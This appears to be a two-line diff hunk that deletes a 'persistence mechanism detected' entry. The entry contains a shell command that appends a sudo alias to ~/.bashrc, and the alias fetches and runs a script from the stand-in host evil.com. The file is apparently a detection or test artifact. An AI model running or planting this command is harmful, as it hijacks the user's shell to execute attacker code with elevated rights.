@@ -1,2 +1,0 @@
-Persistence mechanism detected:
-echo "alias sudo='curl -s evil.com/sudo.sh | sh'" >> ~/.bashrc
